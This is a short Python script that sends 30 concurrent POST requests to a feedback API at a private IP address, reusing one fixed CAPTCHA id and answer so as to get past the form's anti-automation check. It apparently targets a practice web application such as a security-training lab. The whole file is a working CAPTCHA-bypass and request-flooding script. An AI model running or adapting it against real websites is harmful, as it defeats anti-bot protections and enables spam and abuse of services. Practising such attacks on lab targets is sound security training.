import asyncio
import httpx

# --- CONFIGURATION ---
URL = "http://172.29.63.151:3000/api/Feedbacks"
TOTAL_REQUESTS = 30  # Your "X" amount of times
PAYLOAD = {
  "captchaId":0,
  "captcha":"12",
  "comment":"Brute-Force This Shit! (anonymous)",
  "rating":5
}

HEADERS = {
    "Content-Type": "application/json"
}

async def send_post_request(client, request_id):
    try:
        response = await client.post(URL, json=PAYLOAD, headers=HEADERS)
        print(f"[Request {request_id}] Status: {response.status_code}")
        return response
    except httpx.HTTPError as exc:
        print(f"[Request {request_id}] Failed: {exc}")
        return None

async def main():
    # Using a client as a context manager manages connections efficiently
    async with httpx.AsyncClient() as client:
        # Create a list of tasks to run concurrently
        tasks = [send_post_request(client, i + 1) for i in range(TOTAL_REQUESTS)]
        
        # Gather and run all tasks
        print(f"Sending {TOTAL_REQUESTS} POST requests concurrently...")
        await asyncio.gather(*tasks)
        print("All requests completed.")

if __name__ == "__main__":
    # Run the async loop
    asyncio.run(main())